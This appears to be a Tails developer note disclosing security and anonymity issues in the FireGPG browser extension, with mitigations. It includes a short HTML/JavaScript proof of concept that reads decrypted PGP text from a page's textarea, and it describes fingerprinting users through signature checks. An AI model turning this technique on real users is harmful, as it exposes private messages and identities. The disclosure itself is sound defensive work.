Per a discussion on #tor-dev and later #tails with rransom and katmagic it came
to light that FireGPG may have a few serious security and anonymity issues
(katmagic even claimed with "85%" certainty that these issues were among the
main reasons FireGPG was discontinued):

# Decrypted text can be stolen though JavaScript

When decrypting a PGP block in a text box using FireGPG, it is possible for the
site (or exit node through injects) to steal the decrypted text by using
JavaScript.

## Sample attack

    <html>
    	<head>
    		<script type="text/javascript">
    			function decrypt() {
    				var elem = document.getElementById("pgp_msg");
    
    				if (elem.innerHTML != elem.value) {
    					elem.innerHTML = elem.value;
    					alert(elem.value);
    				}
    			}
    			window.setInterval(decrypt, 1000);
    		</script>
    	</head>
    
    	<body>
    <textarea id="pgp_msg" style="height: 600px; width: 600px">
    -----BEGIN PGP MESSAGE-----
    <snip>
    -----END PGP MESSAGE-----
    </textarea>
    	</body>
    </html>

rransom tested this exploit, and it worked. A similar approach should
also work for stealing a plaintext written in a text box before it's encrypted.

## Mitigations

Set extensions.firegpg.result_always_in_new_window to true. With this set, the
results of crypto operations are shown in a new window, so any
JavaScript on the page with the PGP block cannot touch it. However, this does
not protect against JavaScript stealing the plaintext before it's encrypted.
To protect against that the user would have to use FireGPG's "text editor" (or
the Seahorse plugin for gedit, or similar) to write the plaintext, 
encrypt and then copy the ciphertext to the text box.

# Fingerprint users based on silent signature verification

If it is possible to use JavaScript to check signatures, an attacker could
potentially learn the user's whole key chain by replaying messages and their
signatures made by those key holders. This would give the attacker an awful lot
of identifying bits of the user.

## Mitigation?

It is unclear whether there is any facility for this in FireGPG. The FireGPG
API may enable it, so it should definitely be disabled (it's disabled by
default in Tails), but who knows what other stuff is in there.
